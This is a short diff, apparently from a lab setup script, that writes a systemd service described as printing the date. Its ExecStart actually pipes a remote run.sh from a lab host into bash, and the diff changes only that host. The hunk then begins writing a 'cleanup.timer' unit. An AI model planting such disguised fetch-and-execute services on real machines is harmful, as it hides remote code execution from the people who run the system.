@@ -24,7 +24,7 @@ Description=Prints date into /tmp/date file
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c "/usr/bin/curl web1.umcstlab.net:8080/run.sh | /bin/bash"
+ExecStart=/bin/bash -c "/usr/bin/curl web0.linux.spicelab.org:8080/run.sh | /bin/bash"
 EOM
 
 cat > /etc/systemd/system/cleanup.timer <<- EOM
